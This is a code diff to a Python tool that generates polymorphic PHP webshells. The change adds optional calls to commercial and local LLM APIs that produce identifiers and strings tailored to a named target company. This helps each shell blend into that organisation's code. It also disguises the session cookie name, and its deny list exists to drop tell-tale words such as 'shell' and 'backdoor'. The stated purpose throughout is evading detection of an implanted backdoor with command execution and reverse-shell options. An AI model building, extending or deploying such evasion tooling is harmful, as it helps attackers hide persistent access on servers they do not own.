@@ -4,6 +4,9 @@ p0wnyShellX - Polymorphic PHP Webshell Generator
 Usage: python3 p0wnyShellX.py -p MyPass -o shell.php [options]
 """
 import argparse, random, string, base64, sys, subprocess
+import json, os, re, urllib.error, urllib.request
+
+VERSION = "3.0.0"
 
 # ─────────────────────────────────────────────────────────────────────────────
 # NAME POOLS
@@ -115,7 +118,7 @@ HTML_ID_POOL = [
 # JUNK FUNCTION BODIES
 # ─────────────────────────────────────────────────────────────────────────────
 
-def _junk_body(rng):
+def _junk_body(rng, extra_words=None):
     n1 = rng.randint(2,8); n2 = rng.randint(100,999); n3 = rng.randint(1000,9999)
     n4 = rng.randint(0,20); n5 = rng.randint(60,100)
     words_a = ['status','state','health','mode','level','tier','zone','env']
@@ -124,6 +127,11 @@ def _junk_body(rng):
     words_d = ['cpu','mem','io','net','disk','swap','cache','buf']
     words_e = ['alpha','beta','gamma','delta','epsilon','zeta','eta','theta']
     words_f = ['running','stopped','degraded','paused','error','ready','active']
+    if extra_words:
+        # LLM-supplied vocabulary, spread across the literal pools
+        buckets = [words_a, words_b, words_c, words_d, words_e, words_f]
+        for i, w in enumerate(extra_words):
+            buckets[i % len(buckets)].append(w)
     fmts = ['Y-m-d','c','U','D M j G:i:s','Y/m/d H:i']
     regions = ['eu-west','us-east','ap-south','eu-north','us-west','ap-east']
 
@@ -209,8 +217,8 @@ def _junk_body(rng):
     ]
     return rng.choice(choices)
 
-def gen_junk_functions(rng, count, used_names):
-    available = [n for n in PHP_FUNC_POOL if n not in used_names]
+def gen_junk_functions(rng, count, used_names, pool=None, extra_words=None):
+    available = [n for n in (pool or PHP_FUNC_POOL) if n not in used_names]
     rng.shuffle(available)
     funcs = []
     sigs = [
@@ -224,7 +232,7 @@ def gen_junk_functions(rng, count, used_names):
     for i in range(min(count, len(available))):
         fname = available[i]
         sig = rng.choice(sigs)(fname)
-        body = _junk_body(rng)
+        body = _junk_body(rng, extra_words=extra_words)
         funcs.append(f"{sig} {{\n{body}\n}}\n")
     return funcs
 
@@ -272,7 +280,7 @@ MIMIC_PARAM_POOL = [
     'token','nonce','sig','key','sid','fmt','charset','region',
 ]
 
-def generate_transport_context(rng: random.Random, mode: str) -> dict:
+def generate_transport_context(rng: random.Random, mode: str, param_pool: list | None = None) -> dict:
     if mode == 'plain':
         return {
             'p_cmd': 'cmd', 'p_cwd': 'cwd',
@@ -285,7 +293,7 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
             'p_pause': 'scan_pause', 'p_rs_method': 'rs_method',
             'p_ps_probe': 'ps_probe',
         }
-    pool = list(MIMIC_PARAM_POOL)
+    pool = list(param_pool or MIMIC_PARAM_POOL)
     rng.shuffle(pool)
     ctx = {
         'p_cmd': pool[0], 'p_cwd': pool[1],
@@ -308,6 +316,222 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
             'b64_alpha':     ''.join(alpha),
         })
     return ctx
+
+# ─────────────────────────────────────────────────────────────────────────────
+# OPTIONAL LLM AUGMENTATION (opt-in via --llm; stdlib only; silent fallback)
+# ─────────────────────────────────────────────────────────────────────────────
+#
+# Design rule: the LLM only ever produces *atoms* — identifiers and string
+# literals. Every candidate is regex-validated before it may enter a pool, so
+# a hallucinated brace or a prose answer can never reach the output file, and
+# the functional core of the shell stays reviewed template code. Any network,
+# auth or parse failure falls back to the static pools silently: a build with
+# --llm can degrade, it can never break.
+
+_LLM_DEFAULT_MODELS = {
+    "ollama":    "llama3.2",
+    "deepseek":  "deepseek-chat",
+    "anthropic": "claude-haiku-4-5-20251001",
+    "openai":    "gpt-4o-mini",
+    "kimi":      "moonshot-v1-8k",
+}
+_LLM_ENV_KEYS = {
+    "deepseek":  "DEEPSEEK_API_KEY",
+    "anthropic": "ANTHROPIC_API_KEY",
+    "openai":    "OPENAI_API_KEY",
+    "kimi":      "MOONSHOT_API_KEY",
+}
+_LLM_ENDPOINTS = {  # OpenAI-compatible chat APIs
+    "deepseek": "https://api.deepseek.com/v1",
+    "openai":   "https://api.openai.com/v1",
+    "kimi":     "https://api.moonshot.cn/v1",
+}
+
+_IDENT_RE   = re.compile(r'^[a-z][a-zA-Z0-9]{2,39}$')       # camelCase function names
+_PARAM_RE   = re.compile(r'^[a-z][a-z0-9_]{1,19}$')         # POST parameter names
+_APPNAME_RE = re.compile(r'^[A-Z][A-Za-z0-9 &\'_.-]{2,39}$')  # "FleetOps Console"
+_WORD_RE    = re.compile(r'^[a-z][a-z0-9-]{2,19}$')         # junk literal words
+
+_LLM_VALIDATORS = {
+    'func_names':   _IDENT_RE,
+    'app_names':    _APPNAME_RE,
+    'mimic_params': _PARAM_RE,
+    'junk_words':   _WORD_RE,
+}
+
+# Substrings that would *hurt* camouflage if they appeared in an identifier —
+# an LLM asked for "believable" names sometimes produces telltale ones.
+_LLM_DENY_SUBSTRINGS = (
+    'shell', 'payload', 'backdoor', 'exploit', 'passwd', 'password',
+    'base64', 'malware', 'hack', 'cmd', 'exec', 'c2', 'webshell',
+)
+
+# Rotating framings per category — the model sees varied requests, which
+# improves diversity across builds (same trick as batforge/powershellforge).
+_LLM_PROMPTS = {
+    'func_names': [
+        'Return {n} plausible camelCase PHP function names for internal business/IT tooling{ctx}. '
+        'Verb-noun style, like archiveReplicationLog or fetchComplianceStatus. '
+        'Respond with a JSON array of strings only.',
+        'List {n} realistic camelCase function names you would find in a company internal dashboard{ctx}. '
+        'Professional verb-noun naming. JSON array of strings, no explanation.',
+        'Generate {n} credible camelCase backend function names for an internal ops tool{ctx}. '
+        'Each 2-4 words joined, lowerCamelCase. JSON string array only.',
+    ],
+    'app_names': [
+        'Return {n} plausible names for an internal infrastructure monitoring web console{ctx}. '
+        'Title Case, 2-3 words, like "Cluster Console" or "Node Inspector". JSON array of strings only.',
+        'List {n} credible internal ops dashboard product names{ctx}. '
+        'Short Title Case names, no version numbers. JSON array only.',
+    ],
+    'mimic_params': [
+        'Return {n} short lowercase HTTP POST parameter names a web application would use{ctx}. '
+        'Single words or snake_case, like query, payload or shipment_ref. JSON array of strings only.',
+        'List {n} common webapp form/API field names{ctx}. '
+        'Lowercase, short, realistic. JSON string array only.',
+    ],
+    'junk_words': [
+        'Return {n} plausible lowercase technical words used in config values and status strings '
+        'of internal IT tooling{ctx}. Single words, like nominal, relay or eu-west. JSON array only.',
+        'List {n} terse ops/status vocabulary words{ctx}. '
+        'Lowercase single words, varied domains (infra, deploy, network). JSON array only.',
+    ],
+}
+
+
+def _llm_context_clause(company: str | None, context: str | None) -> str:
+    """Build the target-context sentence appended to every prompt."""
+    parts = []
+    if company:
+        parts.append(f'the organization "{company.strip()}"')
+    if context:
+        parts.append(f'({context.strip()})')
+    if not parts:
+        return ''
+    return (' for ' + ' '.join(parts) +
+            ' — they must blend into its internal vocabulary (industry jargon, business domain),'
+            ' as if written by its own developers')
+
+
+def _parse_llm_list(text: str) -> list[str]:
+    """Extract a string list from an LLM response regardless of formatting."""
+    text = re.sub(r"```(?:json|JSON)?\s*", "", text)
+    text = re.sub(r"```\s*", "", text).strip()
+    try:
+        parsed = json.loads(text)
+        if isinstance(parsed, list):
+            return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
+    except json.JSONDecodeError:
+        pass
+    m = re.search(r"\[.*?\]", text, re.DOTALL)
+    if m:
+        try:
+            parsed = json.loads(m.group())
+            if isinstance(parsed, list):
+                return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
+        except json.JSONDecodeError:
+            pass
+    lines = []
+    for raw in text.splitlines():
+        line = raw.strip()
+        line = re.sub(r"^[\d]+[.)]\s*", "", line)
+        line = line.strip("-*•·").strip('"').strip("'").strip(",").strip()
+        if line and not line.startswith(("[", "]", "{")) and len(line) > 1:
+            lines.append(line)
+    return lines
+
+
+def _llm_call_ollama(prompt: str, model: str) -> str:
+    base = os.environ.get("OLLAMA_HOST", "http://localhost:11434").rstrip('/')
+    payload = json.dumps({
+        "model": model, "prompt": prompt, "stream": False,
+        "options": {"temperature": 0.9, "num_predict": 512},
+    }).encode()
+    req = urllib.request.Request(f"{base}/api/generate", data=payload,
+                                 headers={"Content-Type": "application/json"}, method="POST")
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        return json.loads(resp.read()).get("response", "")
+
+
+def _llm_call_openai_compat(prompt: str, model: str, api_key: str, base_url: str) -> str:
+    payload = json.dumps({
+        "model": model,
+        "messages": [{"role": "user", "content": prompt}],
+        "temperature": 0.9, "max_tokens": 512,
+    }).encode()
+    req = urllib.request.Request(f"{base_url.rstrip('/')}/chat/completions", data=payload,
+                                 headers={"Content-Type": "application/json",
+                                          "Authorization": f"Bearer {api_key}"}, method="POST")
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        data = json.loads(resp.read())
+    return data["choices"][0]["message"]["content"]
+
+
+def _llm_call_anthropic(prompt: str, model: str, api_key: str) -> str:
+    payload = json.dumps({
+        "model": model, "max_tokens": 512,
+        "messages": [{"role": "user", "content": prompt}],
+    }).encode()
+    req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload,
+                                 headers={"Content-Type": "application/json",
+                                          "x-api-key": api_key,
+                                          "anthropic-version": "2023-06-01"}, method="POST")
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        data = json.loads(resp.read())
+    return data["content"][0]["text"]
+
+
+class LLMProvider:
+    """Optional LLM backend for pool augmentation. Instantiate once per build.
+
+    variants() returns validated, deduplicated atoms — or an empty list on any
+    failure (caller then just uses the static pools). Results are cached per
+    category, so one build costs at most one request per category.
+    """
+
+    def __init__(self, spec: str, company: str | None = None, context: str | None = None):
+        parts = (spec or "").split(":", 1)
+        self.provider = parts[0].lower().strip()
+        if self.provider not in _LLM_DEFAULT_MODELS:
+            raise ValueError(f"Unknown LLM provider {self.provider!r}. "
+                             f"Valid: {', '.join(_LLM_DEFAULT_MODELS)}")
+        self.model = parts[1] if len(parts) > 1 and parts[1] else _LLM_DEFAULT_MODELS[self.provider]
+        self.ctx_clause = _llm_context_clause(company, context)
+        self._cache: dict[str, list[str]] = {}
+
+    def _raw(self, prompt: str) -> str:
+        if self.provider == "ollama":
+            return _llm_call_ollama(prompt, self.model)
+        if self.provider == "anthropic":
+            return _llm_call_anthropic(prompt, self.model, os.environ.get("ANTHROPIC_API_KEY", ""))
+        key = os.environ.get(_LLM_ENV_KEYS[self.provider], "")
+        return _llm_call_openai_compat(prompt, self.model, key, _LLM_ENDPOINTS[self.provider])
+
+    def variants(self, category: str, n: int, rng: random.Random,
+                 exclude: set[str] | None = None) -> list[str]:
+        """Up to n validated atoms for the category. Empty list on any failure."""
+        if category not in _LLM_PROMPTS:
+            return []
+        key = f"{category}:{n}"
+        if key not in self._cache:
+            prompt = rng.choice(_LLM_PROMPTS[category]).format(n=n, ctx=self.ctx_clause)
+            try:
+                raw = self._raw(prompt)
+                candidates = _parse_llm_list(raw)
+            except (urllib.error.URLError, KeyError, json.JSONDecodeError, OSError, IndexError):
+                candidates = []
+            validator = _LLM_VALIDATORS[category]
+            seen = set(exclude or ())
+            ok = []
+            for c in candidates:
+                c = c.strip()
+                if (validator.match(c) and c not in seen
+                        and not any(bad in c.lower() for bad in _LLM_DENY_SUBSTRINGS)):
+                    seen.add(c)
+                    ok.append(c)
+            self._cache[key] = ok
+        return self._cache[key]
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # CSS THEMES
@@ -523,7 +747,7 @@ THEME_NONE = {
 # HELPERS
 # ─────────────────────────────────────────────────────────────────────────────
 
-def generate_poly_theme(rng):
+def generate_poly_theme(rng, app_names=None):
     h   = rng.randint(0, 359)
     ah  = (h + rng.randint(130, 230)) % 360
     bg_s = rng.randint(8, 20)
@@ -539,7 +763,7 @@ def generate_poly_theme(rng):
         return f"hsla({hh},{max(0, ss)}%,{max(3, ll)}%,{aa:.2f})"
 
     return {
-        "app_name":       rng.choice(POLY_APP_NAMES),
+        "app_name":       rng.choice(app_names or POLY_APP_NAMES),
         "version_prefix": rng.choice(POLY_VER_PREFIXES),
         "body_bg":         hsl(h, bg_s, bg_l),
         "body_fg":         hsl(h, fg_s, fg_l),
@@ -587,9 +811,10 @@ def pick(pool, used, rng):
 def build_php_section(n, jv, ids, route_param, routes, session_key_val,
                       bcrypt_hash, username, junk_before, junk_after,
                       case_order, theme, ver, rng,
-                      transport, transport_ctx, features, no_auth=False):
+                      transport, transport_ctx, features, no_auth=False,
+                      poly_app_names=None):
     if theme == 'poly':
-        T = generate_poly_theme(rng)
+        T = generate_poly_theme(rng, app_names=poly_app_names)
     elif theme == 'none':
         T = THEME_NONE
     else:
@@ -1087,7 +1312,8 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     if no_auth:
         auth_block = ""
     else:
-        auth_block = f"""session_start(['cookie_httponly' => true, 'use_strict_mode' => true, 'cookie_samesite' => 'Lax']);
+        auth_block = f"""session_name('{n['sess_name']}');
+session_start(['cookie_httponly' => true, 'use_strict_mode' => true, 'cookie_samesite' => 'Lax']);
 
 define('{n['sess_const']}', '{session_key_val}');
 define('{n['user_const']}', '{username}');
@@ -1743,6 +1969,33 @@ def generate(args, info=None):
     junk_count = args.junk if args.junk is not None else rng.randint(20, 80)
     theme = args.theme if args.theme else rng.choice(list(CSS_THEMES.keys()))
 
+    # Optional LLM pool augmentation (opt-in via --llm; static pools on failure).
+    # Local copies only — the module-level pools are never mutated.
+    llm = getattr(args, 'llm_provider', None)
+    php_pool   = list(PHP_FUNC_POOL)
+    js_pool    = list(JS_FUNC_POOL)
+    mimic_pool = list(MIMIC_PARAM_POOL)
+    poly_names = list(POLY_APP_NAMES)
+    junk_words: list = []
+    if llm:
+        names  = llm.variants('func_names', 60, rng,
+                              exclude=set(PHP_FUNC_POOL) | set(JS_FUNC_POOL))
+        params = llm.variants('mimic_params', 25, rng, exclude=set(MIMIC_PARAM_POOL))
+        apps   = llm.variants('app_names', 12, rng, exclude=set(POLY_APP_NAMES))
+        words  = llm.variants('junk_words', 30, rng)
+        php_pool   += names[:45]
+        js_pool    += names[45:]
+        mimic_pool += params
+        poly_names += apps
+        junk_words  = words
+        if names or params or apps or words:
+            print(f"[+] LLM       : {llm.provider}:{llm.model} — "
+                  f"+{len(names)} names, +{len(params)} params, "
+                  f"+{len(apps)} app names, +{len(words)} words", file=info)
+        else:
+            print(f"[!] LLM       : {llm.provider}:{llm.model} unavailable "
+                  f"or empty — static pools only", file=info)
+
     # Routing tokens
     route_param = rnd_token(rng, 6)
     routes = {
@@ -1776,7 +2029,7 @@ def generate(args, info=None):
                 'expand_tilde','read_file','write_file','get_cwd','tab_complete',
                 'resolve_task','get_env_info','is_session','start_session',
                 'safe_cmp','check_creds']:
-        n[key] = pick(PHP_FUNC_POOL, used_php, rng)
+        n[key] = pick(php_pool, used_php, rng)
 
     cfg_var_pool = ["nodeConfig","clusterData","envProfile","sysContext","runtimeEnv",
                     "agentConfig","infraState","hostProfile","sessionEnv","deployCtx"]
@@ -1786,6 +2039,9 @@ def generate(args, info=None):
     n['sess_const'] = 'SESS_' + rnd_token(rng, 6).upper()
     n['user_const'] = 'AUSR_' + rnd_token(rng, 4).upper()
     n['hash_const'] = 'PHSH_' + rnd_token(rng, 5).upper()
+    # Session cookie name — a per-build plausible custom name instead of PHPSESSID
+    n['sess_name'] = rng.choice(['SESSID', 'APPSESSID', 'OPSSESSION', 'NODESESS',
+                                 'SVCSESSION', 'CONSOLE_SID', 'MGRID', 'SESSKEY'])
 
     # JS function names
     used_js = set()
@@ -1793,7 +2049,7 @@ def generate(args, info=None):
     for key in ['append_line','insert_stdout','pipe_call','resolve_task','suggest_entry',
                 'save_blob','trigger_export','file_to_stream','get_header','refresh_scope',
                 'neutralize_html','update_meta','dispatch_key','cache_query','b64u']:
-        jv[key] = pick(JS_FUNC_POOL, used_js, rng)
+        jv[key] = pick(js_pool, used_js, rng)
 
     used_jv = set()
     for key in ['cfg','cwd','cmd_history','history_pos','e_input','e_content']:
@@ -1808,7 +2064,8 @@ def generate(args, info=None):
     ids['prompt_cls'] = 'ctx-' + rnd_token(rng, 5)
 
     # Junk functions
-    all_junk = gen_junk_functions(rng, junk_count, used_php)
+    all_junk = gen_junk_functions(rng, junk_count, used_php,
+                                  pool=php_pool, extra_words=junk_words)
     rng.shuffle(all_junk)
     mid = len(all_junk) // 2
     junk_before = all_junk[:mid]
@@ -1830,7 +2087,7 @@ def generate(args, info=None):
     ver = f"{rng.randint(1,9)}.{rng.randint(0,9)}.{rng.randint(0,999)}"
 
     # Transport context (param names + optional crypto keys)
-    transport_ctx = generate_transport_context(rng, args.transport)
+    transport_ctx = generate_transport_context(rng, args.transport, param_pool=mimic_pool)
 
     features = {
         'revshell':  args.revshell,
@@ -1845,6 +2102,7 @@ def generate(args, info=None):
         case_order, theme, ver, rng,
         args.transport, transport_ctx, features,
         no_auth=args.no_auth,
+        poly_app_names=poly_names,
     )
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1865,6 +2123,9 @@ Examples:
   python3 p0wnyShellX.py -p "MyPass!" --seed 42 -o repro.php
   python3 p0wnyShellX.py -p "MyPass!" --transport mimic -o shell.php
   python3 p0wnyShellX.py -p "MyPass!" --transport rc4 -o shell.php
+  python3 p0wnyShellX.py -p "MyPass!" --llm ollama -o shell.php
+  python3 p0wnyShellX.py -p "MyPass!" --llm ollama:qwen2.5 --company "Acme Logistics" -o shell.php
+  python3 p0wnyShellX.py -p "MyPass!" --llm anthropic --company "Acme" --context "logistics, France" -o shell.php
 """
     )
     parser.add_argument('-p', '--password', default='changeme666',
@@ -1897,9 +2158,18 @@ Examples:
                         help='Compile pingsweep command into the shell (opt-in; not included by default)')
     parser.add_argument('-d', '--outdir', default=None,
                         help='Output directory. Combined with -o (filename only). E.g. -d /tmp/ -o shell.php → /tmp/shell.php')
+    parser.add_argument('--llm', default=None, metavar='SPEC',
+                        help='Optional LLM pool augmentation, off by default. SPEC = provider[:model] with '
+                             'provider in ollama | deepseek | anthropic | openai | kimi. Local: ollama (OLLAMA_HOST, '
+                             'default http://localhost:11434). Cloud: key from DEEPSEEK_API_KEY / ANTHROPIC_API_KEY / '
+                             'OPENAI_API_KEY / MOONSHOT_API_KEY. Falls back to static pools on any failure.')
+    parser.add_argument('--company', default=None, metavar='NAME',
+                        help='Target organization name — LLM generates names/strings in its vocabulary (requires --llm)')
+    parser.add_argument('--context', default=None, metavar='TEXT',
+                        help='Extra target context, e.g. "logistics, France" (requires --llm)')
+    parser.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
     args = parser.parse_args()
 
-    import os
     if args.outdir:
         outname = os.path.basename(args.output) if args.output != 'shell.php' else 'shell.php'
         args.output = os.path.join(args.outdir.rstrip('/'), outname or 'shell.php')
@@ -1911,6 +2181,22 @@ Examples:
 
     if args.no_junk:
         args.junk = 0
+
+    # Optional LLM augmentation wiring
+    args.llm_provider = None
+    if (args.company or args.context) and not args.llm:
+        print("[!] --company/--context have no effect without --llm — ignoring", file=sys.stderr)
+    if args.llm:
+        try:
+            args.llm_provider = LLMProvider(args.llm, company=args.company, context=args.context)
+        except ValueError as e:
+            parser.error(str(e))
+        if args.seed is not None:
+            print("[!] --seed makes the RNG deterministic but LLM output is not — "
+                  "seeded + LLM builds are not reproducible", file=sys.stderr)
+        if args.company and args.llm_provider.provider != 'ollama':
+            print(f"[!] OPSEC: --company sends the target name to {args.llm_provider.provider} — "
+                  f"prefer --llm ollama (local) for sensitive engagements", file=sys.stderr)
 
     # When --stdout is set, info messages go to stderr so PHP can be piped cleanly
     info = sys.stderr if args.stdout else sys.stdout
@@ -1932,6 +2218,10 @@ Examples:
     print(f"[+] Theme     : {theme_used}", file=info)
     print(f"[+] Junk      : {junk_used} functions", file=info)
     print(f"[+] Transport : {args.transport}", file=info)
+    if args.llm_provider:
+        ctx_bits = [b for b in (args.company, args.context) if b]
+        print(f"[+] LLM       : {args.llm_provider.provider}:{args.llm_provider.model}"
+              + (f" (context: {', '.join(ctx_bits)})" if ctx_bits else ""), file=info)
     if args.seed:
         print(f"[+] Seed      : {args.seed}", file=info)
 
